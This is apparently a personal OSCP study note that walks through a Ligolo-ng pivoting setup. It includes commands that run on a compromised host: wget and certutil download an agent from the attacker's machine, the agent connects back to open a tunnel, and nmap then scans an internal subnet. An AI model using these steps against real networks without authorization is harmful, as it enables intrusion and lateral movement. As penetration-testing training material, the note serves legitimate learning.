Created: 2026-07-24 13:50
#note

# 🔀 Pivoting Masterclass: Ligolo-ng Setup Guide

> [!important] Why Ligolo-ng over Chisel/SOCKS?
> Ligolo-ng creates a native TUN interface on your Kali machine. You can use standard tools (`nmap`, `netexec`, `impacket`, `bloodhound.py`, `evil-winrm`) directly against internal IP addresses without using `proxychains`!

---

## 1. Setup on Kali (Proxy)

1. **Create TUN Interface:**
   ```bash
   sudo ip tuntap add user <YOUR_USERNAME> mode tun ligolo
   sudo ip link set dev ligolo up
   ```

2. **Launch Proxy Server:**
   ```bash
   ./proxy -selfcert -laddr 0.0.0.0:11601
   ```

---

## 2. Setup on Compromised Target (Agent)

1. **Transfer Agent:**
   - Linux: `wget http://<KALI_IP>:8000/agent`
   - Windows: `certutil.exe -urlcache -f http://<KALI_IP>:8000/agent.exe agent.exe`

2. **Execute Agent & Connect Back:**
   - Linux: `./agent -connect <KALI_IP>:11601 -ignore-cert`
   - Windows: `.\agent.exe -connect <KALI_IP>:11601 -ignore-cert`

---

## 3. Activate Tunnel on Kali

1. **Select Agent Session in Ligolo Proxy Console:**
   ```text
   ligolo-ng » session
   [1] User@TARGET-MACHINE (192.168.1.50)
   ligolo-ng » session 1
   ```

2. **Add Network Route on Kali Host:**
   ```bash
   sudo ip route add 172.16.1.0/24 dev ligolo
   ```

3. **Start Tunnel:**
   ```text
   [session 1] ligolo-ng » start
   ```

4. **Verify Connectivity:**
   ```bash
   nmap -Pn -p 445,3389 172.16.1.10
   ```

---

## 🔗 Useful External Links
- [Ligolo-ng Official Repository](https://github.com/nico-cha30/ligolo-ng)
- [Ligolo-ng Official Documentation](https://nico-cha30.github.io/ligolo-ng/)

#### Tags
#oscp #pivoting #ligolo-ng #tunneling #networking #active_directory
